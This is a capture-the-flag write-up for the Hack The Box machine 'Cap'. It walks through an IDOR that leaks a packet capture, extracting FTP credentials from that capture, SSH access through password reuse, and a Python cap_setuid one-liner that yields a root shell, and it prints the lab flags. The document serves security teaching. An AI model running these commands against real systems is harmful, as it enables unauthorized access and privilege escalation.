# HTB Cap — Writeup
**Platform:** Hack The Box  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 2026-05-31  
**Author:** GP Singh (PyHackSecGP)  

---

## Summary

Cap is an Easy Linux machine that chains two vulnerabilities: an **IDOR on a network capture endpoint** that leaks plaintext FTP credentials, followed by **Linux capability abuse** (`cap_setuid` on Python) to escalate to root. Both findings map to real-world misconfigurations seen in production environments.

---

## Recon

### Port Scan

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Gunicorn (Security Dashboard)
```

Three services. Anonymous FTP blocked. SSH version gives us the OS (Ubuntu Focal). The web app on port 80 is the main attack surface.

---

## Enumeration

### Web Application — Security Dashboard

Visiting `http://10.129.12.255` reveals a security monitoring dashboard. Key endpoints from the HTML:

- `/capture` — triggers a 5-second packet capture (PCAP)
- `/ip` — shows IP config
- `/netstat` — shows network status

After triggering `/capture`, the app redirects to `/data/1` — a page showing analysis of the captured traffic, with a **Download** button pointing to `/download/1`.

The sequential ID immediately signals an **IDOR opportunity**.

### IDOR — Accessing Capture ID 0

The app assigns monotonically increasing IDs to each capture. ID 0 would be the very first capture ever taken — before any player connected. Requesting `/data/0` returns a valid page with a download link, confirming the IDOR:

```bash
curl -s http://10.129.12.255/data/0 | grep download
# <button ... onclick="location.href='/download/0'">Download</button>
```

**Why this works:** The app performs no authorization check on the capture ID. Any user can access any capture by changing the number in the URL. This is OWASP A01:2021 — Broken Access Control (IDOR pattern, CWE-284).

### Credential Extraction from PCAP

Download the capture and inspect it:

```bash
curl -s http://10.129.12.255/download/0 -o capture0.pcap
tcpdump -r capture0.pcap -A 2>/dev/null | grep -E "USER|PASS"
```

Output:
```
FTP: USER nathan
FTP: PASS Buck3tH4TF0RM3!
```

FTP transmits credentials in **cleartext over TCP**. Anyone capturing traffic on the network sees the password. This is exactly what a network monitoring tool like this dashboard would capture.

---

## Initial Access

Credentials recovered: `nathan:Buck3tH4TF0RM3!`

Test password reuse on SSH (common on CTFs and in real environments):

```bash
ssh nathan@10.129.12.255
```

Direct shell as `nathan`. Grab user flag:

```
user.txt: ea34748abba367e85ac0aec4f9932bad
```

---

## Privilege Escalation

### Enumeration

```bash
id        # uid=1001(nathan) gid=1001(nathan)
sudo -l   # nathan may not run sudo
getcap -r / 2>/dev/null
```

`getcap` output:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

### Capability Abuse — cap_setuid on Python

Linux capabilities are a fine-grained privilege system — instead of full root, a binary can be granted specific kernel capabilities. `cap_setuid` allows a process to arbitrarily change its UID, including to 0 (root), **without** needing the setuid bit or sudo.

`/usr/bin/python3.8` has `cap_setuid`. Python can call `os.setuid(0)` to become root, then spawn a shell:

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Root shell. Grab root flag:

```
root.txt: 3a0175a10c1007605d6b3813fb2cb37b
```

---

## Attack Chain

```
Web app IDOR (/data/0)
    → Download pre-existing PCAP
    → FTP creds in plaintext (nathan:Buck3tH4TF0RM3!)
    → SSH as nathan (password reuse)
    → getcap: python3.8 has cap_setuid
    → os.setuid(0) → root shell
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Sniffing | T1040 | PCAP captured FTP session with plaintext creds |
| Exploitation for Credential Access | T1212 | IDOR gave access to prior capture |
| Valid Accounts | T1078 | Reused FTP creds for SSH |
| Abuse Elevation Control Mechanism | T1548 | cap_setuid on Python3.8 |

---

## Key Takeaways

1. **Sequential IDs without authorization checks are always IDOR candidates.** Always fuzz `/data/0`, `/data/1` when you see numeric IDs in URLs.

2. **FTP is insecure by design.** It sends credentials in plaintext. Any network capture tool will expose them. Use SFTP or SCP instead.

3. **Linux capabilities are a privesc vector as dangerous as SUID bits** — often overlooked. Always run `getcap -r / 2>/dev/null` during enumeration.

4. **`cap_setuid` on any scripting interpreter** (Python, Perl, Ruby) = instant root. One line.

5. **Password reuse is extremely common.** Creds found anywhere should be tested against SSH, FTP, and the web app immediately.

---

## Tools Used

- nmap
- curl
- ftp
- tcpdump
- ssh
- getcap
- python3 (privesc)

---

*Published by GP Singh — PyHackSecGP*  
*GitHub: github.com/PyHackSecGP*
